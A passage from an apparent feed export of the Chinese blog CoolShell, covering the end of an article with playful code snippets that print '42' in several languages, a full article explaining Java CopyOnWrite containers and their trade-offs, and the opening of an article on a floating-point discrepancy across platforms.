解释：其中，bc是一个计算器。tr是一个字符转换的命令，比如：&lt;code&gt;echo "good" | tr "good" "test"&lt;/code&gt;输出 &lt;code&gt;tsst&lt;/code&gt;。也就是说，g-t, o-e, o-s, d-t的映射，o被映了两次，所以，第二次会覆盖第一次。对于上面的&lt;code&gt;tr "a-z " 0-7-0-7-729&lt;/code&gt;的意思是：abcdefg分别对应01234567，h对应-，ijklmno对应01234567，p对于2，剩下的包括空格都是9。如果你对tr和sed和bc不熟悉的话，可以man一下，关于sed你可以看一下我的《&lt;a href="https://coolshell.cn/articles/9104.html" target="_blank"&gt;sed简明教程&lt;/a&gt;》

[shell]#!/bin/bash

#Vertical Version
echo $((2#100))
echo $((2#10))

#Horizontal Version
echo $((2#000100))$((2#00010))[/shell]

解释：2#100的意思就是说，#左边的数说明是“2进制”，右边的数是二进制数“100”，如16#ff就是16进制的ff，也就是十进制的255

[shell]echo "obase=13;6*9"|bc|figlet[/shell]

上面的命令输出：&lt;/pre&gt;
&lt;pre style="font-family: 'Consolas','Courier New', Courier, monospace;"&gt;
 _  _  ____
| || ||___ \
| || |_ __) |
|__   _/ __/
   |_||_____|&lt;/pre&gt;


解释：为了使用figlet命令，你还要去安装一个figlet（&lt;a href="http://www.figlet.org/" target="_blank"&gt;http://www.figlet.org/&lt;/a&gt;）这是一个让你画ASCII图的命令。&lt;/pre&gt;

&lt;h4&gt;Python&lt;/h4&gt;

Windows下，给你画个图：

&lt;div style="height: 300px; overflow: auto;"&gt;[python]import win32api, win32con, win32gui
from time import time, sleep
import os

w = { 1:[(358, 263), (358, 262), (358, 261), (359, 261), (359, 262), (359, 264), (359, 266), (359, 270), (359, 282),
     (358, 289), (357, 308), (356, 319), (355, 341), (355, 351), (355, 360), (355, 378), (355, 388), (354, 397),
     (354, 406), (354, 422), (354, 428), (354, 436), (354, 438), (354, 439), (354, 440), (355, 440), (356, 439),
     (357, 439), (358, 438), (360, 438), (362, 437), (369, 437), (372, 437), (381, 437), (386, 437), (391, 437),
     (397, 436), (411, 436), (419, 435), (434, 435), (442, 435), (449, 434), (456, 434), (468, 434), (473, 435),
     (480, 436), (483, 436), (485, 436), (487, 437), (488, 437), (488, 438), (488, 439), (487, 440), (486, 440),
     (485, 440), (484, 440), (483, 439), (483, 437), (481, 431), (481, 427), (481, 420), (481, 413), (483, 396),
     (485, 387), (488, 367), (491, 356), (493, 345), (500, 321), (503, 310), (507, 299), (514, 280), (517, 272),
     (520, 266), (523, 260), (524, 258), (524, 259), (524, 261), (524, 265), (524, 269), (523, 275), (522, 289),
     (521, 297), (518, 315), (516, 324), (515, 334), (513, 345), (509, 368), (507, 382), (502, 411), (500, 426),
     (498, 440), (495, 453), (491, 478), (489, 491), (485, 517), (483, 530), (481, 542), (479, 552), (476, 570),
     (475, 577), (474, 588), (473, 592), (473, 595), (473, 597), (473, 600), (473, 601), (473, 602), (473, 601),
     (474, 599), (475, 597), (476, 594), (478, 587)],
  2:[(632, 305), (634, 306), (636, 309), (639, 314), (641, 319), (645, 330), (647, 337), (649, 353), (649, 362),
     (649, 372), (649, 384), (645, 409), (639, 436), (636, 448), (632, 459), (627, 470), (623, 479), (613, 497),
     (608, 503), (599, 512), (595, 514), (591, 514), (587, 513), (581, 504), (578, 498), (576, 483), (575, 476),
     (575, 469), (579, 454), (582, 447), (591, 436), (595, 432), (600, 430), (605, 429), (617, 432), (624, 437),
     (639, 448), (646, 455), (654, 461), (662, 469), (679, 484), (686, 491), (702, 504), (710, 509), (718, 512),
     (727, 514), (744, 515), (752, 515), (767, 512), (774, 510), (779, 508), (783, 505), (788, 499), (789, 495),
     (789, 486)] }

def d( x1, y1, x2, y2 ):
    win32api.SetCursorPos((x1, y1))
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
    win32api.SetCursorPos((x2, y2))
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
    sleep(0.01)

def p( l1 ):
    l2 = [""]
    l2.extend(l1)
    l1.append("")
    l3 = zip(l2, l1)
    l3.pop(0)
    l3.pop(-1)
    for n in l3:
        d(n[0][0], n[0][1], n[1][0], n[1][2])

os.startfile("C:\Windows\system32\mspaint.exe")
sleep(0.5)
win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_MAXIMIZE)
sleep(0.5)

for n in w:
    p(w[n])[/python]&lt;/div&gt;

输出：&lt;img src="https://coolshell.cn/wp-content/uploads/2014/03/1j0va.png" alt="" width="300" height="240" class="aligncenter size-full wp-image-11172" /&gt;

lambda表达式 

[python]&gt;&gt;&gt; p = lambda x: x%2!=0 and True&lt;&gt;&gt; sum(p(i) for i in range(0,6))[/python]

解释：对python的lambda表达式或函数式编程不是很清楚的同学可以看一下《&lt;a href="https://coolshell.cn/articles/10822.html" target="_blank"&gt;函数式编程&lt;/a&gt;》&lt;/pre&gt;
&lt;h4&gt;Java&lt;/h4&gt;

[java]import java.lang.*;
class answer_to_everything 
{
    void static main() 
    {
        String s = "Hitchhiker's Guide to the Galaxy";
        String s2 = "Don'tPanic";
        String s3 = "The Restaurant at the End of the Universe.";

        int arthur_dent = s.length();
        int ford_prefect = s2.length();
        int zooey_deschanel = s3.length();
        int vogon_poetry = arthur_dent + ford_prefect;

        System.out.println("         " + vogon_poetry + "       " + zooey_deschanel + " " + zooey_deschanel); //in case you're confused, I'm using Zooey to print the big '2', and Vogons to print the big '4'.
        System.out.println("       " + vogon_poetry + vogon_poetry + "     " + zooey_deschanel + "     " + zooey_deschanel);
        System.out.println("     " + vogon_poetry + "  " + vogon_poetry + "    " + zooey_deschanel + "       " + zooey_deschanel);
        System.out.println("   " + vogon_poetry + "    " + vogon_poetry + "            " + zooey_deschanel);
        System.out.println(" " + vogon_poetry + "      " + vogon_poetry + "          " + zooey_deschanel);
        System.out.println(vogon_poetry + " " + vogon_poetry + " " + vogon_poetry + " DA " + vogon_poetry + "     " + zooey_deschanel);
        System.out.println("         " + vogon_poetry + "     " + zooey_deschanel);
        System.out.println("         " + vogon_poetry + "    " + zooey_deschanel + " " + zooey_deschanel + " " + zooey_deschanel + " " + zooey_deschanel);
    }
}</pre>
<p>上面这段看上去平淡无奇，但其亮点是那三个string，这段代码输出：</p>
<pre style="font-family: 'Consolas','Courier New', Courier, monospace;">         42       42 42
       4242     42     42
     42  42    42       42
   42    42            42
 42      42          42
42 42 42 DA 42     42
         42     42
         42    42 42 42 42</pre>
<p>别忘了Java也可以混乱代码：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public        class         FourtyTwo{ public
static         void         main(String[]args)
{  new        javax                    .swing.
JFrame        () {{                    setSize
(42 /(        42/42                    +42/42)
*42/ (        42/42                    +42/42)
,42/(42/ 42+42/42)*         42/(42/42+42/42));
}public void paint(         java.awt .Graphics
  g){g.drawPolygon(         new int[]{42,42,42
              + 42+         42,42+
              42+42         ,42+42
              +42 +         42,42+
              42+42         +42,42
              + 42+         42,42+42+42,42+42,
              42+42         },new int[]{42,42+
              42+42         +42,42+42+42+42,42

+42+42+42+42+42,                  42+42+
42+42+42+42,42,42,               42+42+42
,42 +        42+42              ,42}, (42/
42+42        /42)*              (42/  42 +
42/42        + 42/             42 +    42 /
42+42        /42))            ;g.drawPolygon
( new        int[]           {42+42+42+42+42,
42+42        +42 +           42+42      , 42+
42+42        + 42+          42+42        + 42,
42+42        +42 +          42+42        +42 +
42,42+42+42+42+42,         42+42          + 42+
42+42,42+ 42+42+           42+42          +42 +

42+42,42+42+42+42+42+42+42+42,42+42+42+42+42+42,
42+42+42+42+42+42,42+42+42+42+42+42+42+42,42+42+
42+42+42+42+42+42},new int[]{42,42 +42,42+42,42+
42+42,42+42+42,42+42+42+42+42+42,42+42+42+42+42+
42,42+42+42+42+42,42+42+42+42+42,42+42+42+42,42+
42+42+42,42},(42/42+42/42+42/42)*((42/42+42/42)*
(42/42+42/ 42)));};}.setVisible(42*42*42!=42);}}</pre>
<h4>
<span class="ez-toc-section" id="CC"></span>C/C++<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include
int main()
{
    printf("%d", fprintf( fopen("/dev/null","w"),
       "so-popularity-contest\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b") );
}
</pre>
<p>解释：\b是backspace，fprintf的返回值是写成功数据的长度。</p>
<div style="height: 200px; overflow: auto;">
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include&lt;iostream&gt;
using namespace std;
int main()
{
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)66&lt;&lt;(char)73&lt;&lt;(char)82;
    cout&lt;&lt;(char)84&lt;&lt;(char)72&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)68&lt;&lt;(char)69;
    cout&lt;&lt;(char)65&lt;&lt;(char)84&lt;&lt;(char)72;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)95;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)95&lt;&lt;(char)32&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)47&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)124&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)124&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)47&lt;&lt;(char)32&lt;&lt;(char)47;
    cout&lt;&lt;(char)124&lt;&lt;(char)32&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)124&lt;&lt;(char)95&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)124&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)47;
    cout&lt;&lt;(char)32&lt;&lt;(char)47&lt;&lt;(char)32;
    cout&lt;&lt;(char)124&lt;&lt;(char)49&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)47;
    cout&lt;&lt;(char)50&lt;&lt;(char)124&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)47&lt;&lt;(char)32;
    cout&lt;&lt;(char)47&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)124&lt;&lt;(char)57&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)84&lt;&lt;(char)79&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)47&lt;&lt;(char)48;
    cout&lt;&lt;(char)47&lt;&lt;(char)32&lt;&lt;'\n';
    cout&lt;&lt;(char)47&lt;&lt;(char)32&lt;&lt;(char)47;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)124&lt;&lt;(char)53&lt;&lt;(char)124;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)47&lt;&lt;(char)48&lt;&lt;(char)47;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;'\n';
    cout&lt;&lt;(char)124&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)124&lt;&lt;(char)50&lt;&lt;(char)124;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)47;
    cout&lt;&lt;(char)49&lt;&lt;(char)47&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)124&lt;&lt;(char)32&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)47&lt;&lt;(char)32;
    cout&lt;&lt;(char)47&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)124&lt;&lt;(char)32&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)47&lt;&lt;(char)32&lt;&lt;(char)47;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)95&lt;&lt;(char)32&lt;&lt;'\n';
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)32;
    cout&lt;&lt;(char)124&lt;&lt;(char)95&lt;&lt;(char)124;
    cout&lt;&lt;(char)32&lt;&lt;(char)32&lt;&lt;(char)124;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)95&lt;&lt;(char)95&lt;&lt;(char)95;
    cout&lt;&lt;(char)95&lt;&lt;(char)124&lt;&lt;'\n';
    return 0;
}  </pre>
</div>
<p>输出：</p>
<p><img alt="image placeholder" ></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;

#define six  1+5
#define nine 8+1

int main()
{
    printf("what do you get when you multiply six by nine?\n");
    printf("%i x %i = %i\n", six, nine, six*nine);
}</pre>
<p>解释：6 x 9 = 42 ???，如果你知道宏只是做简单的字符串替换的话，你就知道six*nine被替换成了1+5*8+1这个表达式了。呵呵。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">        main(c     ,z,_){c==01?
       main(c+     1,0,c^c):c==2
      ?z=_["#"     "#$#%&amp;#%#x'%%"
     "()&amp;(%%x"             "$%$("
    "(&amp;(""*%x"             "'%%("
   "(&amp;(" "+%x"             "'#%("
  "(&amp;("  "%#x"             ],z ?z
 =='x'?main(4,_     ,c*5):main(c
 +1,z,0),main(c    ,z,_+1):00:c
 ==3?(_+-2)==3?    main(_-1,_,
         32):(     main(
         c+1,c     ,((2+
         c)*(z     -35)+
         _)[""     "six"
         "*ni"     "ne= {   }   "
         "  ;"     "      _   ( "
         ") ["     " 3 ]do {;"]==
         32?32     :043),main(c,z
         ,_+1)     ):putchar(_);}</pre>
<p>解释：参看<a href="https://codegolf.stackexchange.com/questions/21835/most-creative-way-to-display-42/21950#21950" target="_blank">原文的这个答案</a>里的How-To一节。</p>
<h4>
<span class="ez-toc-section" id="Brainfuck"></span>Brainfuck<span class="ez-toc-section-end"></span>
</h4>
<p>代码混乱自然少不了brainfuck语言：（更多的奇葩的编程语言请参考《<a href="https://coolshell.cn/articles/4458.html" target="_blank">那些BT雷人的编程语言</a>》）</p>
<pre style="font-family: 'Consolas','Courier New', Courier, monospace;"> 
         +++++          +++[&gt;+&gt;++&gt;
        +++&gt;++        ++&gt;+++++&gt;+++++
       +&gt;+++++       ++&gt;+        ++++
      +++ &gt;+++       ++++        ++&gt;+
     +++  ++++                   ++&gt;+
    +++   ++++                  +++&gt;
   +++    ++++                 ++++
  +&gt;+     ++++               ++++
 +++      +&gt;++             ++++
++++++++&gt;+++++++++       ++++
++&gt;+++++++++++++++     +&lt;&lt;&lt;
          &lt;&lt;&lt;&lt;        &lt;&lt;&lt;&lt;
          &lt;&lt;&lt;&lt;       
          &gt;&gt;&gt;&gt;       &gt;&gt;----.++++&lt;&lt;&lt;&lt;&lt;
          &lt;&lt;&gt;&gt;       &gt;&gt;&gt;&gt;++.--&lt;&lt;&lt;&lt;&lt;<.>
<p>不过，下面这个BrainFuck更无聊，所以顶在了最佳答案上：</p>
<pre style="font-family: 'Consolas','Courier New', Courier, monospace;">           +++++[&gt;++[&gt;+&gt;+        ++&gt;++++&gt;++++&gt;++++&gt;++++++
          &gt;++++++&gt;+++++++        ++&gt;+++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;
         &gt;+&gt;+&gt;+&gt; &gt;&gt;&gt;+[&gt;       &gt;++&gt;--&gt;&gt;+&gt;&gt;++&gt;+
        &gt;--&lt;&lt;&lt;&lt;  &lt;&lt;<..... .>            ....<...... ...>...   &lt;<.>....                       &gt;.&gt;&gt;&gt;&gt;&gt;.<. ..>..&gt;&gt;&gt;&gt;&gt;.&lt;
      .&lt;&lt;&lt;<.>&gt;&gt;.&lt;<.>&gt;&gt;&gt;&gt;.<.>...&gt;                    &gt;&gt;&gt;.&gt;&gt;&gt;.
     &lt;&lt;<.>&gt;                  .&gt;&gt;&gt;&gt;&gt;.&lt;
    <.>&gt;                 &gt;&gt;&gt;.&lt;&lt;&lt;
   <.. ...>...               &lt;<.>..&gt;.
   &gt;&gt;.<.>&gt;...&lt;<...>&gt;...&lt;         <....>&gt;..
  .&lt;&lt;<.>.&gt;&gt;..&gt;.&lt;<....... .....>...
                 &lt;<.>...            .....&gt;...
                 <...... .>&gt;&gt;.&lt;<..>...          .....&gt;...<......>.&gt;&gt;.<. .>......        ..&gt;&gt;...&lt;<....>&gt;.....&gt;.<..>.
</..></....></.></......></..></......></.></.......></.></....></...></.></.></..></.></.></.></.></.></.></.></......></.....></pre>
<p>执行上面的代码，你会得到下面的输出：</p>
<pre style="font-family: 'Consolas','Courier New', Courier, monospace;">      ++++         +++
    +[&gt;++++    ++[&gt;+   &gt;++    +++
  +.-   ---   ---    ---
 --.+++++++         +++
        +++       .++
        +++      +.-
        ---    -----.--.</pre>
<p>再执行上面的代码，会输出：</p>
<pre>6*7=42</pre>
<p>如果6*9=42就完美了，就差一步啊……</p>
<p>(全文完)</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 - CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
</.></pre> ]]></content>
<pubDate>2014-03-06T22:42:42+08:00</pubDate>
<guid>https://coolshell.cn/articles/11170.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Java中的CopyOnWrite容器 ]]></title>
<link>https://coolshell.cn/articles/11175.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" ><strong>感谢 <a href="http://ifeve.com" target="_blank">清英</a> 同学的投稿</strong></p>
<p>Copy-On-Write简称COW，是一种用于程序设计中的优化策略。其基本思路是，从一开始大家都在共享同一个内容，当某个人想要修改这个内容的时候，才会真正把内容Copy出去形成一个新的内容然后再改，这是一种延时懒惰策略。从JDK1.5开始Java并发包里提供了两个使用CopyOnWrite机制实现的并发容器,它们是CopyOnWriteArrayList和CopyOnWriteArraySet。CopyOnWrite容器非常有用，可以在非常多的并发场景中使用到。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BB%80%E4%B9%88%E6%98%AFCopyOnWrite%E5%AE%B9%E5%99%A8" title="什么是CopyOnWrite容器">什么是CopyOnWrite容器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#CopyOnWriteArrayList%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86" title="CopyOnWriteArrayList的实现原理">CopyOnWriteArrayList的实现原理</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#CopyOnWrite%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF" title="CopyOnWrite的应用场景">CopyOnWrite的应用场景</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#CopyOnWrite%E7%9A%84%E7%BC%BA%E7%82%B9" title="CopyOnWrite的缺点">CopyOnWrite的缺点</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BB%80%E4%B9%88%E6%98%AFCopyOnWrite%E5%AE%B9%E5%99%A8"></span>什么是CopyOnWrite容器<span class="ez-toc-section-end"></span>
</h4>
<p>CopyOnWrite容器即写时复制的容器。通俗的理解是当我们往一个容器添加元素的时候，不直接往当前容器添加，而是先将当前容器进行Copy，复制出一个新的容器，然后新的容器里添加元素，添加完元素之后，再将原容器的引用指向新的容器。这样做的好处是我们可以对CopyOnWrite容器进行并发的读，而不需要加锁，因为当前容器不会添加任何元素。所以CopyOnWrite容器也是一种读写分离的思想，读和写不同的容器。</p>
<p><span id="more-11175"></span></p>
<h4>
<span class="ez-toc-section" id="CopyOnWriteArrayList%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"></span>CopyOnWriteArrayList的实现原理<span class="ez-toc-section-end"></span>
</h4>
<p>在使用CopyOnWriteArrayList之前，我们先阅读其源码了解下它是如何实现的。以下代码是向ArrayList里添加元素，可以发现在添加的时候是需要加锁的，否则多线程写的时候会Copy出N个副本出来。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public boolean add(T e) {
    final ReentrantLock lock = this.lock;
    lock.lock();
    try {

        Object[] elements = getArray();

        int len = elements.length;
        // 复制出新数组

        Object[] newElements = Arrays.copyOf(elements, len + 1);
        // 把新元素添加到新数组里

        newElements[len] = e;
        // 把原数组引用指向新数组

        setArray(newElements);

        return true;

    } finally {

        lock.unlock();

    }

}

final void setArray(Object[] a) {
    array = a;
}
</pre>
<p>读的时候不需要加锁，如果读的时候有多个线程正在向ArrayList添加数据，读还是会读到旧的数据，因为写的时候不会锁住旧的ArrayList。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public E get(int index) {
    return get(getArray(), index);
}
</pre>
<p>JDK中并没有提供CopyOnWriteMap，我们可以参考CopyOnWriteArrayList来实现一个，基本代码如下：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
import java.util.Collection;
import java.util.Map;
import java.util.Set;

public class CopyOnWriteMap&lt;K, V&gt; implements Map&lt;K, V&gt;, Cloneable {
    private volatile Map&lt;K, V&gt; internalMap;

    public CopyOnWriteMap() {
        internalMap = new HashMap&lt;K, V&gt;();
    }

    public V put(K key, V value) {

        synchronized (this) {
            Map&lt;K, V&gt; newMap = new HashMap&lt;K, V&gt;(internalMap);
            V val = newMap.put(key, value);
            internalMap = newMap;
            return val;
        }
    }

    public V get(Object key) {
        return internalMap.get(key);
    }

    public void putAll(Map&lt;? extends K, ? extends V&gt; newData) {
        synchronized (this) {
            Map&lt;K, V&gt; newMap = new HashMap&lt;K, V&gt;(internalMap);
            newMap.putAll(newData);
            internalMap = newMap;
        }
    }
}
</pre>
<p>实现很简单，只要了解了CopyOnWrite机制，我们可以实现各种CopyOnWrite容器，并且在不同的应用场景中使用。</p>
<h4>
<span class="ez-toc-section" id="CopyOnWrite%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"></span>CopyOnWrite的应用场景<span class="ez-toc-section-end"></span>
</h4>
<p>CopyOnWrite并发容器用于读多写少的并发场景。比如白名单，黑名单，商品类目的访问和更新场景，假如我们有一个搜索网站，用户在这个网站的搜索框中，输入关键字搜索内容，但是某些关键字不允许被搜索。这些不能被搜索的关键字会被放在一个黑名单当中，黑名单每天晚上更新一次。当用户搜索时，会检查当前关键字在不在黑名单当中，如果在，则提示不能搜索。实现代码如下：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">package com.ifeve.book;

import java.util.Map;

import com.ifeve.book.forkjoin.CopyOnWriteMap;

/**
 * 黑名单服务
 *
 * @author fangtengfei
 *
 */
public class BlackListServiceImpl {

    private static CopyOnWriteMap&lt;String, Boolean&gt; blackListMap = new CopyOnWriteMap&lt;String, Boolean&gt;(
            1000);

    public static boolean isBlackList(String id) {
        return blackListMap.get(id) == null ? false : true;
    }

    public static void addBlackList(String id) {
        blackListMap.put(id, Boolean.TRUE);
    }

    /**
     * 批量添加黑名单
     *
     * @param ids
     */
    public static void addBlackList(Map&lt;String,Boolean&gt; ids) {
        blackListMap.putAll(ids);
    }

}
</pre>
<p>代码很简单，但是使用CopyOnWriteMap需要注意两件事情：</p>
<p>1. 减少扩容开销。根据实际需要，初始化CopyOnWriteMap的大小，避免写时CopyOnWriteMap扩容的开销。</p>
<p>2. 使用批量添加。因为每次添加，容器每次都会进行复制，所以减少添加次数，可以减少容器的复制次数。如使用上面代码里的addBlackList方法。</p>
<h4>
<span class="ez-toc-section" id="CopyOnWrite%E7%9A%84%E7%BC%BA%E7%82%B9"></span>CopyOnWrite的缺点<span class="ez-toc-section-end"></span>
</h4>
<p>CopyOnWrite容器有很多优点，但是同时也存在两个问题，即内存占用问题和数据一致性问题。所以在开发的时候需要注意一下。</p>
<p><strong>内存占用问题</strong>。因为CopyOnWrite的写时复制机制，所以在进行写操作的时候，内存里会同时驻扎两个对象的内存，旧的对象和新写入的对象（注意:在复制的时候只是复制容器里的引用，只是在写的时候会创建新对象添加到新容器里，而旧容器的对象还在使用，所以有两份对象内存）。如果这些对象占用的内存比较大，比如说200M左右，那么再写入100M数据进去，内存就会占用300M，那么这个时候很有可能造成频繁的Yong GC和Full GC。之前我们系统中使用了一个服务由于每晚使用CopyOnWrite机制更新大对象，造成了每晚15秒的Full GC，应用响应时间也随之变长。</p>
<p>针对内存占用问题，可以通过压缩容器中的元素的方法来减少大对象的内存消耗，比如，如果元素全是10进制的数字，可以考虑把它压缩成36进制或64进制。或者不使用CopyOnWrite容器，而使用其他的并发容器，如<a href="http://ifeve.com/concurrenthashmap/" target="_blank">ConcurrentHashMap</a>。</p>
<p><strong>数据一致性问题</strong>。CopyOnWrite容器只能保证数据的最终一致性，不能保证数据的实时一致性。所以如果你希望写入的的数据，马上能读到，请不要使用CopyOnWrite容器。</p>
<p>关于C++的STL中，曾经也有过Copy-On-Write的玩法，参见陈皓的《<a href="http://blog.csdn.net/haoel/article/details/24058" target="_blank">C++ STL String类中的Copy-On-Write</a>》，后来，因为有很多线程安全上的事，就被去掉了。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-03-07T08:26:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/11175.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个浮点数跨平台产生的问题 ]]></title>
<link>https://coolshell.cn/articles/11235.html</link>
<content><![CDATA[ 
<p><strong>感谢网友<a href="http://www.tanglei.name/" target="_blank">唐磊</a>（微博@<a title="唐磊_name" href="https://weibo.com/tangleithu?from=feed&amp;loc=nickname">唐磊_name</a>）投稿，本文原文在唐磊的博客上（<a href="http://www.tanglei.name/a-bug-relate-with-float-point-between-x86-and-x64-in-csharp/">原文地址</a>），原文分析还不够好，而且可能对人有误导，所以，我对原文做了很多修改，并加了Linux下的内容。浮点数是一个很复杂的事情，希望这篇文章有助于大家了解浮点数与其相关的C/C++的编译选项。</strong>（注：我没有Windows 32位以及C#的环境，所以，对于Windows 32位的程序和C#的程序没有验证过）</p>
<p>背景就简单点儿说，最近一个项目C#编写，涉及浮点运算，来龙去脉省去，直接看如下代码。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">float p3x = 80838.0f;
float p2y = -2499.0f;
double v321 = p3x * p2y;
Console.WriteLine(v321);[/csharp]

